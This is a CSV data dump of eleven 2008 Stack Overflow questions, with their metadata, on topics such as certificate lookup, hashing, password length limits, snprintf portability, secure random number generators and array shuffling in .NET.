Id,PostTypeId,AcceptedAnswerId,ParentId,CreationDate,DeletionDate,Score,ViewCount,Body,OwnerUserId,OwnerDisplayName,LastEditorUserId,LastEditorDisplayName,LastEditDate,LastActivityDate,Title,Tags,AnswerCount,CommentCount,FavoriteCount,ClosedDate,CommunityOwnedDate
"97865","1","100215","","2008-09-18 23:06:41","","10","27971","<p>I am developing a web app that will be hit frequently by mobile browsers. I am wondering if there is a way to get enough information from the browser request to lookup position data (triangulation or GPS) <strong>Not from the request directly, of course.</strong> A colleague suggested there some carriers supply a unique identifier in the request header that can be sent to a web service exposed by said provider that will return position data if the customer has enabled that. Can anyone point me in the right direction for this or any other method for gleaning position data, even very approximate. Obviously this is app candy, e.g. if the data is not available the app doesn't really care...</p>

<p>Or perhaps a web service by carrier that will provide triangulated data by IP?</p>
","67","Rex M","147141","Rex M","2009-10-07 22:16:07","2011-08-18 17:32:45","Get position data from mobile browser","<mobile><gps>","5","0","8","","2008-09-18 23:06:41"
"98074","1","98419","","2008-09-18 23:42:11","","8","8350","<p>I have a given certificate installed on my server. That certificate has valid dates, and seems perfectly valid in the Windows certificates MMC snap-in.</p>

<p>However, when I try to read the certificate, in order to use it in an HttpRequest, I can't find it. Here is the code used:</p>

<pre><code>    X509Store store = new X509Store(StoreName.Root, StoreLocation.LocalMachine);
    store.Open(OpenFlags.ReadOnly); X509Certificate2Collection col =
    store.Certificates.Find(X509FindType.FindBySerialNumber, ""xxx"", true);
</code></pre>

<p><code>xxx</code> is the serial number; the argument <code>true</code> means ""only valid certificates"". The returned collection is empty.</p>

<p>The strange thing is that if I pass <code>false</code>, indicating invalid certificates are acceptable, the collection contains one element&mdash;the certificate with the specified serial number.</p>

<p>In conclusion: the certificate appears valid, but the <code>Find</code> method treats it as invalid! Why?</p>
","18073","","2663","icelava","2009-01-04 09:22:15","2009-01-04 09:22:15","Why is this X.509 certificate considered invalid?","<c#><ssl><certificate><x509>","3","0","1","",""
"98153","1","","","2008-09-18 23:58:05","","45","47858","<p>I've found the standard hashing function on VS2005 is painfully slow when trying to achieve high performance look ups. What are some good examples of fast and efficient hashing algorithms that should void most collisions?</p>
","13646","PiNoYBoY82","11206","Dark Shikari","2008-09-19 00:07:56","2016-12-24 17:27:38","What's the best hashing algorithm to use on a stl string when using hash_map?","<c++><windows><performance><stl><hash>","11","2","20","",""
"98768","1","98786","","2008-09-19 01:49:29","","147","66197","<p>I can understand that imposing a minimum length on passwords makes a lot of sense (to save users from themselves), but my <strong>bank</strong> has a requirement that passwords are between 6 and 8 characters long, and I started wondering...</p>

<ul>
<li>Wouldn't this just make it easier for brute force attacks? (Bad)</li>
<li>Does this imply that my password is being stored unencrypted? (Bad)</li>
</ul>

<p>If someone with (hopefully) some good IT security professionals working for them are imposing a max password length, should I think about doing similar? What are the pros/cons of this?</p>
","9021","nickf","","","","2019-07-17 08:20:56","Should I impose a maximum length on passwords?","<security><encryption><passwords>","20","8","33","",""
"99528","1","99543","","2008-09-19 04:05:27","","16","8724","<p>I am looking to use a PHP library for uploading pictures to a web server so that I can use something that has been tested and hopefully not have to design one myself.  Does anyone know of such a library?</p>

<p>Edit: I am aware that file uploads are built into PHP, I am looking for a library that may make the process simpler and safer.</p>
","3831","Steven Oxley","3831","Steven Oxley","2008-09-19 04:13:48","2008-09-19 05:21:39","What is a good PHP library to handle file uploads?","<php><file-upload>","4","3","2","2014-07-08 01:49:24",""
"99553","1","788676","","2008-09-19 04:09:29","","24","8925","<p>I'm wondering if it's possible to distribute a RoR app for production use without source code?  I've seen <a href=""https://stackoverflow.com/questions/55711/options-for-distribution-of-an-offline-ruby-on-rails-application"">this post on SO</a>, but my situation is a little different.  This would be an app administered by people with some clue, so I'm cool with still requiring an Apache/Mongrel/MySQL setup on the customer end.  All I really want is for the source to be protected.  Encoding seems a popular way to go for distributing PHP apps (eg: <a href=""http://www.userscape.com/"" rel=""nofollow noreferrer"">Helpspot</a>).</p>

<p>I've found these potential solutions:</p>

<ul>
<li><a href=""http://blog.zenspider.com/zenobfuscate/"" rel=""nofollow noreferrer"">Zenobfuscate</a> - not all types of Ruby code is supported however, so that counts that out</li>
<li><a href=""http://www.rubyencoder.com/"" rel=""nofollow noreferrer"">Ruby Encoder</a> - may be the best option, as their PHP encoder looks alright (I haven't tried it however) but it's not available yet.  I've used IONcube for PHP before and it worked well, but <a href=""http://forum.ioncube.com/viewtopic.php?t=839"" rel=""nofollow noreferrer"">it doesn't seem that IONcube is interested yet</a>.</li>
<li><a href=""http://joyent.com/developers/slingshot/"" rel=""nofollow noreferrer"">Slingshot</a> - it was mentioned in the other SO post, but it solves a different problem to mine and the source is still visible.</li>
<li><a href=""http://www.erikveen.dds.nl/distributingrubyapplications/rails.html"" rel=""nofollow noreferrer"">RubyScript2Exe</a> - from the doco, it's not production ready, so that counts that out.</li>
</ul>

<p>I've heard that potentially using JRuby and distributing bytecode might be a way to achieve this, but I've never used JRuby so I'm not sure what's involved.</p>

<p>Can anyone offer any ideas and/or known examples?  Ideally I'd love to have some kind of automated build scenario as well.</p>
","14530","Dan Harper - Leopard CRM","-1","","2017-05-23 12:09:23","2009-04-28 07:51:47","Can you Distribute a Ruby on Rails Application without Source?","<ruby-on-rails><ruby><encoding><obfuscation><distribution>","7","0","20","",""
"100904","1","100991","","2008-09-19 10:12:36","","3","1479","<p>Per man pages, snprintf is returning number of bytes written from glibc version 2.2 onwards. But on lower versions of libc2.2 and HP-UX, it returns a positive integer, which could lead to a buffer overflow.</p>

<p>How can one overcome this and write portable code?</p>

<p>Edit : For want of more clarity</p>

<p>This code is working perfectly in lib 2.3</p>

<pre><code>    if ( snprintf( cmd, cmdLen + 1, "". %s%s"", myVar1, myVar2 )  != cmdLen )
    {
        fprintf( stderr, ""\nError: Unable to  copy bmake command!!!"");
        returnCode = ERR_COPY_FILENAME_FAILED;
    }
</code></pre>

<p>It returns the length of the string (10) on Linux. But the same code is returning a positive number that is greater than the number of characters printed on HP-UX machine. Hope this explanation is fine.</p>
","18657","","1599","MrValdez","2008-10-03 14:48:45","2015-01-23 23:18:34","How can I overcome inconsistent behaviour of snprintf in different UNIX-like operating systems?","<c><cross-platform><buffer-overflow><buffer-overrun>","6","1","1","",""
"101337","1","101345","","2008-09-19 12:07:12","","25","4401","<p>As the title says: What is the difference between a non-secure random number generator and a secure random number generator?</p>
","12178","shoban","24231","zacherates","2019-02-13 19:05:20","2019-02-13 19:05:20","What is the difference between a non-secure random number generator and a secure random number generator?","<random><cryptography>","7","1","5","",""
"102742","1","102878","","2008-09-19 15:20:45","","143","19516","<p>Like many of you, I use ReSharper to speed up the development process. When you use it to override the equality members of a class, the code-gen it produces for GetHashCode() looks like:</p>

<pre class=""lang-cs prettyprint-override""><code>    public override int GetHashCode()
    {
        unchecked
        {
            int result = (Key != null ? Key.GetHashCode() : 0);
            result = (result * 397) ^ (EditableProperty != null ? EditableProperty.GetHashCode() : 0);
            result = (result * 397) ^ ObjectId;
            return result;
        }
    }
</code></pre>

<p>Of course I have some of my own members in there, but what I am wanting to know is why 397?</p>

<ul>
<li>EDIT: So my question would be better worded as, is there something 'special' about the 397 prime number outside of it being a prime number?</li>
</ul>
","5289","","430885","matt b","2018-01-22 11:55:56","2018-01-22 11:55:56","Why is '397' used for ReSharper GetHashCode override?","<hash><resharper><hash-code-uniqueness>","3","0","28","",""
"108518","1","108575","","2008-09-20 15:39:54","","31","38583","<p>I am developing a Win32 application and I would like to use an RSA encryption library. <strong>Which library would you recommend?</strong></p>
","17675","Zombies","505893","","2012-02-28 14:31:14","2013-10-18 16:39:19","RSA encryption library for C++","<c++><winapi><encryption><rsa>","9","0","7","2013-11-28 21:32:16",""
"108819","1","108836","","2008-09-20 17:33:26","","121","125094","<p>What is the best way to randomize an array of strings with .NET? My array contains about 500 strings and I'd like to create a new <code>Array</code> with the same strings but in a random order.</p>

<p>Please include a C# example in your answer.</p>
","16440","Matthias","11635","","2015-10-24 16:19:00","2019-06-26 12:34:33","Best way to randomize an array with .NET","<c#><.net><algorithm><sorting><random>","17","2","48","",""
